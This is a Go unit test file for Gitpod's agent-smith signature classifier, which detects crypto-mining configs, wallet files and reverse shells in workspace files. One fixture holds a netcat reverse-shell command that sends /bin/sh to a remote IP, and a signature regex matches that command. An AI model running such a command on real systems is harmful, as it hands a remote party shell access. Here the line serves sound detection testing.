// Copyright (c) 2024 Gitpod GmbH. All rights reserved.
// Licensed under the GNU Affero General Public License (AGPL).
// See License.AGPL.txt in the project root for license information.

package classifier

import (
	"os"
	"path/filepath"
	"testing"
)

func TestSignatureMatchClassifier_MatchesFile(t *testing.T) {
	// Create temporary directory for test files
	tempDir, err := os.MkdirTemp("", "agent-smith-test")
	if err != nil {
		t.Fatalf("failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(tempDir)

	// Create test files
	testFiles := map[string][]byte{
		"mining.conf":  []byte("pool=stratum+tcp://pool.example.com:4444\nwallet=1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"),
		"wallet.dat":   []byte("Bitcoin wallet data with private keys"),
		"normal.txt":   []byte("This is just a normal text file"),
		"script.sh":    []byte("#!/bin/bash\necho 'Hello World'"),
		"malicious.sh": []byte("#!/bin/bash\nnc -e /bin/sh 192.168.1.1 4444"),
	}

	for filename, content := range testFiles {
		filePath := filepath.Join(tempDir, filename)
		if err := os.WriteFile(filePath, content, 0644); err != nil {
			t.Fatalf("failed to create test file %s: %v", filename, err)
		}
	}

	tests := []struct {
		name        string
		signatures  []*Signature
		filePath    string
		expectMatch bool
		expectLevel Level
	}{
		{
			name: "filesystem signature with filename match",
			signatures: []*Signature{
				{
					Name:     "mining_pool_config",
					Domain:   "filesystem",
					Pattern:  []byte("stratum+tcp://"),
					Filename: []string{"mining.conf", "*.conf"},
				},
			},
			filePath:    filepath.Join(tempDir, "mining.conf"),
			expectMatch: true,
			expectLevel: LevelAudit,
		},
		{
			name: "filesystem signature with wildcard filename",
			signatures: []*Signature{
				{
					Name:     "shell_script",
					Domain:   "filesystem",
					Pattern:  []byte("#!/bin/bash"),
					Filename: []string{"*.sh"},
				},
			},
			filePath:    filepath.Join(tempDir, "script.sh"),
			expectMatch: true,
			expectLevel: LevelVery,
		},
		{
			name: "filesystem signature with content match but wrong filename",
			signatures: []*Signature{
				{
					Name:     "specific_file_only",
					Domain:   "filesystem",
					Pattern:  []byte("Hello World"),
					Filename: []string{"specific.txt"},
				},
			},
			filePath:    filepath.Join(tempDir, "script.sh"),
			expectMatch: false,
			expectLevel: LevelNoMatch,
		},
		{
			name: "filesystem signature without filename restriction",
			signatures: []*Signature{
				{
					Name:    "bitcoin_wallet",
					Domain:  "filesystem",
					Pattern: []byte("Bitcoin wallet"),
				},
			},
			filePath:    filepath.Join(tempDir, "wallet.dat"),
			expectMatch: true,
			expectLevel: LevelBarely,
		},
		{
			name: "process signature should not match filesystem files",
			signatures: []*Signature{
				{
					Name:    "process_only",
					Domain:  "process",
					Pattern: []byte("Hello World"),
				},
			},
			filePath:    filepath.Join(tempDir, "script.sh"),
			expectMatch: false,
			expectLevel: LevelNoMatch,
		},
		{
			name: "filesystem signature with regex pattern",
			signatures: []*Signature{
				{
					Name:     "reverse_shell",
					Domain:   "filesystem",
					Pattern:  []byte("nc.*-e.*sh"),
					Regexp:   true,
					Filename: []string{"*.sh"},
				},
			},
			filePath:    filepath.Join(tempDir, "malicious.sh"),
			expectMatch: true,
			expectLevel: LevelVery,
		},
		{
			name: "no filesystem signatures",
			signatures: []*Signature{
				{
					Name:    "process_sig",
					Domain:  "process",
					Pattern: []byte("anything"),
				},
			},
			filePath:    filepath.Join(tempDir, "normal.txt"),
			expectMatch: false,
			expectLevel: LevelNoMatch,
		},
		{
			name: "content pattern mismatch",
			signatures: []*Signature{
				{
					Name:     "nonexistent_pattern",
					Domain:   "filesystem",
					Pattern:  []byte("this_pattern_does_not_exist"),
					Filename: []string{"*.txt"},
				},
			},
			filePath:    filepath.Join(tempDir, "normal.txt"),
			expectMatch: false,
			expectLevel: LevelNoMatch,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Validate signatures
			for _, sig := range tt.signatures {
				if err := sig.Validate(); err != nil {
					t.Fatalf("signature validation failed: %v", err)
				}
			}

			classifier := NewSignatureMatchClassifier("test", tt.expectLevel, tt.signatures)

			result, err := classifier.MatchesFile(tt.filePath)
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}

			if tt.expectMatch {
				if result.Level == LevelNoMatch {
					t.Errorf("expected match but got no match")
				}
				if result.Level != tt.expectLevel {
					t.Errorf("expected level %v, got %v", tt.expectLevel, result.Level)
				}
				if result.Classifier != ClassifierSignature {
					t.Errorf("expected classifier %v, got %v", ClassifierSignature, result.Classifier)
				}
			} else {
				if result.Level != LevelNoMatch {
					t.Errorf("expected no match but got level %v", result.Level)
				}
			}
		})
	}
}

func TestSignatureMatchClassifier_FilesystemFileNotFound(t *testing.T) {
	signatures := []*Signature{
		{
			Name:    "test_sig",
			Domain:  "filesystem",
			Pattern: []byte("test"),
		},
	}

	classifier := NewSignatureMatchClassifier("test", LevelAudit, signatures)

	result, err := classifier.MatchesFile("/nonexistent/file.txt")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if result.Level != LevelNoMatch {
		t.Errorf("expected no match for nonexistent file, got level %v", result.Level)
	}
}

func TestSignatureMatchClassifier_ContentMatching(t *testing.T) {
	tests := []struct {
		name        string
		filename    string
		content     string
		pattern     string
		expectMatch bool
	}{
		{
			name:        "content matches pattern",
			filename:    "any-file.txt",
			content:     "test content",
			pattern:     "test",
			expectMatch: true,
		},
		{
			name:        "content does not match pattern",
			filename:    "any-file.txt",
			content:     "different content",
			pattern:     "test",
			expectMatch: false,
		},
		{
			name:        "empty content",
			filename:    "empty-file.txt",
			content:     "",
			pattern:     "test",
			expectMatch: false,
		},
		{
			name:        "binary pattern match",
			filename:    "binary-file.dat",
			content:     "foobar\n",
			pattern:     "foobar",
			expectMatch: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Create a temporary file for testing
			tempDir, err := os.MkdirTemp("", "agent-smith-content-test")
			if err != nil {
				t.Fatalf("failed to create temp dir: %v", err)
			}
			defer os.RemoveAll(tempDir)

			filePath := filepath.Join(tempDir, tt.filename)
			if err := os.WriteFile(filePath, []byte(tt.content), 0644); err != nil {
				t.Fatalf("failed to create test file: %v", err)
			}

			signatures := []*Signature{
				{
					Name:     "test_sig",
					Domain:   "filesystem",
					Pattern:  []byte(tt.pattern),
					Filename: []string{}, // Empty filename list - classifier skips filename matching
				},
			}

			if err := signatures[0].Validate(); err != nil {
				t.Fatalf("signature validation failed: %v", err)
			}

			classifier := NewSignatureMatchClassifier("test", LevelAudit, signatures)

			result, err := classifier.MatchesFile(filePath)
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}

			if tt.expectMatch {
				if result.Level == LevelNoMatch {
					t.Errorf("expected content match but got no match")
				}
			} else {
				if result.Level != LevelNoMatch {
					t.Errorf("expected no content match but got level %v", result.Level)
				}
			}
		})
	}
}
